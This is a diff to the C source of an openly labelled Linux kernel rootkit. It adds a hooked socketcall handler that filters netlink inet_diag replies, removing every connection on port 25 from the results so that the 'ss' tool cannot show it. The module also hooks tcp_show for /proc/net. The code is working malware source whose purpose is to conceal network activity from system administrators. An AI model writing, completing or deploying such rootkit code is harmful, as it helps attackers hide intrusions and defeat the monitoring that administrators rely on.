@@ -3,6 +3,7 @@
 #include <net/tcp.h>
 #include <net/udp.h>
 #include <net/inet_sock.h>
+#include <linux/inet_diag.h>
 #include <linux/socket.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
@@ -128,6 +129,19 @@ static int hooked_tcp_show(struct seq_file* file, void* v){
     return tcp_show_orig(file, v);
 }
 
+static int checkport(struct nlmsghdr *nlh){
+    struct inet_diag_msg *r = NLMSG_DATA(nlh);
+    //struct tcpstat s;
+    //s.state = r->idiag_state;
+    //s.local.family = s.remote.family = r->idiag_family;
+	//s.lport = ntohs(r->id.idiag_sport);
+	//s.rport = ntohs(r->id.idiag_dport);
+    int lport = ntohs(r->id.idiag_sport);
+    int rport = ntohs(r->id.idiag_dport);
+    //printk(KERN_ALERT "[Rootkit] lport %d, rport %d\n", lport, rport);
+    return lport == 25;
+}
+
 asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
     // when a socket gets opened with exaclty the arguments which ss uses, return -1
     // returning -1 causes ss to try it via /proc/net, which we already hooked
@@ -135,26 +149,56 @@ asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
     //struct iovec* iov = msg->msg_iov;
     //char *buf = iov->iov_base;
     //struct nlmsghdr* h = (struct nlmsghdr*)buf;
-    long retval = orig_socketcall(call, args);
-    struct sockaddr_in sin;
-    int fd = args[0];
-    int len;
-    long tmp;
+
+    long retval;
+    long status; // this is just for consistence with varnames of "ss"
+    // struct msghdr* msg = (struct msghdr*)&(((unsigned int*)args)[1]);
+    struct msghdr* msg;
+    struct nlmsghdr* h;
+    __kernel_size_t numblocks;
+    struct inet_diag_msg *r;
+    int err;
+    struct nlmsgerr *nlmsg_err;
+    char* previous;
+    char* currhdr;
+    int i;
+    int found=0;
+    int step=0;
+
     if(call == SYS_RECVMSG){
-    //printk(KERN_INFO "%d vs. %d\n", h->nlmsg_type, NLMSG_DONE);
-	//h->nlmsg_seq = ~h->nlmsg_seq;
-	//h->nlmsg_type=0;
-	printk(KERN_INFO "SYS_RECVMSG\n");
-	len = sizeof(sin);
-	tmp = ((asmlinkage long (*)(int, struct sockaddr __user*, int __user*))ptr_sys_getpeername)(fd, (struct sockaddr*)&sin, &len);
-	if (tmp < 0){
-	    printk(KERN_INFO "Error retrieving port number.\n");
-	}
-	printk(KERN_INFO "port no: %d\n", ntohs(sin.sin_port));
-	((char*)args)[48] = NLMSG_DONE;
-	int fd = *(int*)args;
+        // retrieve data structures
+        msg = (struct msghdr*)(((int*)args)[1]);
+        h = (struct nlmsghdr*)(msg->msg_iov->iov_base);
+        numblocks = msg->msg_iovlen;
+        r = NLMSG_DATA(h);
+        // compute "real" result with orig_socketcall
+        retval = orig_socketcall(call, args);
+        // status holds the bytes remaining
+        status = retval;
+
+        previous = NLMSG_DATA(h);
+        while (NLMSG_OK(h, status)) {
+            printk(KERN_ALERT "step %d\n", step++);
+            currhdr = (char*)h;
+
+            if (found == 0){
+                h = NLMSG_NEXT(h, status);
+            }
+            if (checkport(h)){
+                found = 1;
+                printk(KERN_ALERT "Port 25. Doing stuff.\n");
+                for (i=0; i<status; ++i){
+                    // "NLMSG_ALIGN((nlh)->nlmsg_len)" computes the length of the nlmsghdr nlh in bytes.
+                    currhdr[i] = currhdr[i + NLMSG_ALIGN((h)->nlmsg_len)];
+                }
+                retval = retval - NLMSG_ALIGN((h)->nlmsg_len);
+            }
+            else {
+                found = 0;
+            }
+        }
+        return retval;
     }
-    return retval;
     return orig_socketcall(call, args);
 }
 
